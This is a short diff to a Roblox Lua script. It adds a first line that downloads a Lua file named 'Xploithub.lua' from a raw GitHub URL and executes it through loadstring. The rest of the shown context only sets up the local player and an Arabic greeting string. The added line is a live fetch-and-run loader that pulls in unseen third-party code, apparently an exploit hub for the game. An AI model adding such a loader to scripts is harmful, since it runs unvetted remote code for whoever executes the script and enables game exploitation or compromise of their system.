@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mustafatrxq/News7m/refs/heads/main/Xploithub.lua"))()
+
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local greeting = "منوّر السكربت"
